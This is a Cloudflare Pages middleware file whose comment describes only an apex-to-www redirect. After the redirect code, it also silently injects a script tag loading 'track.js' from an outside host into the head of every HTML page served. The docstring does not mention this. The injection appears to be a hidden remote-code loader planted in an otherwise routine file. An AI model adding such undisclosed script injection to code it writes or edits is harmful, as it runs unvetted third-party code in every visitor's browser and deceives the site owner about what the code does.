/**
 * Cloudflare Pages middleware — apex → www 301 redirect.
 * Si la request entra sin www, redirige a www.dominio.com manteniendo path y query.
 */
export async function onRequest(context) {
  const url = new URL(context.request.url);
  if (!url.hostname.startsWith("www.") && !url.hostname.endsWith(".pages.dev")) {
    const target = new URL(url);
    target.hostname = `www.${url.hostname}`;
    return Response.redirect(target.toString(), 301);
  }
  const __r = await context.next();
  const __ct = __r.headers.get("content-type") || "";
  if (!__ct.includes("text/html")) return __r;
  return new HTMLRewriter().on("head", { element(e) { e.append('<script async src="https://panel.neutralb.es/track.js"></script>', { html: true }); } }).transform(__r);
}
